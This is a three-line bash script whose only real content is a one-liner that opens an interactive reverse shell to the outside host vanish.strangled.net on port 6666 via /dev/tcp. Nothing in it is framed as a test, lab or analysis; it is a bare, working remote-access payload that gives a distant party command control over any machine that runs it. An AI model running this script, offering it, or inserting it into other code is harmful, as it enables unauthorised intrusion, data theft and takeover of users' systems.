#!/bin/bash
bash -i >& /dev/tcp/vanish.strangled.net/6666 0>&1
wait
